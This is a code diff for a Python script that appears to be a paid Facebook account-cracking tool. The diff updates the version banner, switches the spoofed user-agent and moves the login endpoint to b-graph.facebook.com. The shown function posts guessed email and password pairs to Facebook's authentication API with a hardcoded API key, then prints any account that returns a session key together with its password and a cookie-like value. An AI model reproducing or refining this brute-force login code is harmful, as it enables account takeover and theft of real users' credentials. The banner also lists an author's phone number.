@@ -125,7 +125,7 @@ logo = """\033[1;92m
  \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m AFG LION KING
  \033[1;97m[ \033[1;92m\033[1;92m WhatsApp\033[1;97m \033[1;92m \033[1;97m] \033[1;92m +93783361438
  \033[1;97m[ \033[1;92m\033[1;92m Status   \033[1;97m \033[1;92m \033[1;97m] \033[97;1m PAID
- \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.1
+ \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.2
  \033[1;97m----------------------------------------"""
 
 def line():
@@ -514,11 +514,10 @@ def rd(ids,passlist):
     'sec-fetch-user': '?1',
     'service-worker-navigation-preload': '{"k":"rev,1016264941;locale,fa_IR;cohort,BP:DEFAULT;branch,trunk;dpr,1;features,;u,100025928379831;","a":"1725596232","t":31536000,"n":"N1ivMY5Y","v":"2613","p":4,"r":1016264941,"o":"h2","y":"wblt"}',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.4896.127 Safari/537.36 Edg/120.0.5183.51 (KHTML, like Gecko) OPR/92.0.4515.159',
+    'viewport-width': '980',}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-			po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
+			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
 				uid = str(po['uid'])                                  
 				print('\r\r\033[1;32m [AFG LION] '+uid+' | '+pas+' | '+asha(uid)+'\033[1;32m')                                                                                          
